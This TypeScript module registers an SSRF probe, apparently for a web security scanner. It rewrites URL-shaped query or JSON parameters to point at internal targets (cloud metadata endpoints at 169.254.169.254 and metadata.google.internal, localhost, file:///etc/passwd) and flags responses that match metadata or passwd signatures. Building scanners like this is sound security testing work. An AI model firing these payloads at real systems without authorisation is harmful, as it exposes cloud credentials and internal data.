import type { Probe, ProbeVariant } from "../types";
import type { ProbeContext } from "../../types";
import { registerProbe } from "../registry";

const INTERNAL_TARGETS = [
    "http://169.254.169.254/latest/meta-data/",
"http://metadata.google.internal/computeMetadata/v1/",
"http://127.0.0.1:80/",
"http://localhost:8080/",
"file:///etc/passwd",
];

const SSRF_SIGNATURES = [
    /ami-id|instance-id|placement\/availability-zone/,
/computeMetadata|service-accounts/,
/root:x:0:0/,
];

function looksLikeUrl(value: string): boolean {
    return /^https?:\/\//i.test(value) || /^\/\//.test(value);
}

function findUrlField(ctx: ProbeContext): { where: "query" | "body"; key: string } | null {
    try {
        const url = new URL(ctx.url);
        for (const [k, v] of url.searchParams) if (looksLikeUrl(v) || /url|uri|link|target|redirect|fetch/i.test(k)) return { where: "query", key: k };
    } catch { /* ignore */ }
    if (ctx.body) {
        try {
            const j = JSON.parse(ctx.body) as Record<string, unknown>;
            for (const [k, v] of Object.entries(j)) {
                if (typeof v === "string" && (looksLikeUrl(v) || /url|uri|link|target|redirect|fetch/i.test(k))) {
                    return { where: "body", key: k };
                }
            }
        } catch { /* ignore */ }
    }
    return null;
}

const variant: ProbeVariant = {
    id: "ssrf.cloud-metadata",
    label: "SSRF · cloud metadata",
    group: "injection",
    severity: "critical",
    mutate(ctx) {
        const slot = findUrlField(ctx);
        if (!slot) return ctx;
        const target = INTERNAL_TARGETS[Math.floor(Math.random() * INTERNAL_TARGETS.length)]!;
        if (slot.where === "query") {
            const url = new URL(ctx.url);
            url.searchParams.set(slot.key, target);
            return { ...ctx, url: url.toString() };
        }
        const j = JSON.parse(ctx.body!) as Record<string, unknown>;
        j[slot.key] = target;
        return { ...ctx, body: JSON.stringify(j) };
    },
    detect(req) {
        if (req.status === "ERR" || !req.bodyText) return null;
        for (const rx of SSRF_SIGNATURES) {
            const m = rx.exec(req.bodyText);
            if (m) {
                return {
                    variantId: variant.id,
                    probeId: "inj.ssrf",
                    probeLabel: "Server-Side Request Forgery",
                    group: "injection",
                    verdict: "CONFIRMED",
                    severity: "critical",
                    confidence: 0.9,
                    evidence: `Internal-response signature matched: "${m[0]}"`,
                    requestUrl: req.url,
                    requestMethod: req.method,
                    requestBody: req.requestBody,
                    responseSnippet: req.bodyText.slice(0, 400),
                };
            }
        }
        return null;
    },
};

export const ssrfProbe: Probe = {
    id: "inj.ssrf",
    label: "Server-Side Request Forgery",
    group: "injection",
    description:
    "Replaces URL-shaped params (or params named url/uri/link/target/redirect) with internal " +
    "targets (cloud metadata, localhost, file://). Detects cloud-metadata signatures in the response.",
    appliesTo(ctx) {
        return findUrlField(ctx) !== null;
    },
    variants: [variant],
};

registerProbe(ssrfProbe);
